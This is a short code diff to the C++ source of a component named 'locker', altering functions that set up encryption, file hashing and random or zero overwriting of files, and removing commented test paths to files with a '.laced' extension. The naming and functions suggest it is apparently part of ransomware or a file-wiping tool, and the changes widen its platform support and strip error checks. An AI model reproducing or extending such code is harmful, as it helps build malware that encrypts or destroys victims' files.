@@ -325,14 +325,13 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 		LOG_ERROR("[GeneratePolicy] [CryptoSystemInit] Failed");
 		return false;
 	}
-#ifdef __linux__
+
 	if(CommandParser::HASH_FILE)
 	{
 		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
 		CryptInfo->hash_sum_method = (HashSumFunc)filesystem::hash_file;
 		return true;
 	}
-#endif
 	
 	if (CommandParser::signature)
 	{
@@ -357,12 +356,7 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 			CryptInfo->overwrite_method = (OverWriteFunc)filesystem::RandomOverWriteFile;
 			CryptInfo->random = (BYTE*)memory::m_malloc(MB);
 #ifdef _WIN32
-			if (!HandleError
-			(BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
-			{
-				LOG_ERROR("[BCryptGenRandom] Failed");
-				return FALSE;
-			}
+			BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 #else
 			RAND_bytes(CryptInfo->random, MB);
 #endif
@@ -376,12 +370,7 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 			memory::memzero_explicit(CryptInfo->zeros, MB);
 			CryptInfo->random = (BYTE*)memory::m_malloc(MB);
 #ifdef _WIN32
-			if (!HandleError
-			(BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
-			{
-				LOG_ERROR("[BCryptGenRandom] Failed");
-				return FALSE;
-			}
+			BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 #else
 			RAND_bytes(CryptInfo->random, MB);
 #endif
@@ -501,8 +490,6 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 	
-	//memcpy(FileInfo->recent_filename, "C:\\Users\\Clown\\Desktop\\test\\tt\\as1.laced.txt", memory::StrLen(FileInfo->recent_filename));
-	//memcpy(FileInfo->recent_filename, "/home/clown/Рабочий стол/LacASD/a/as2.laced.txt", 59);
 	if(GLOBAL_STATE.g_write_in)
 	{
 		FileInfo->recent_filehandle = FileInfo->filehandle;
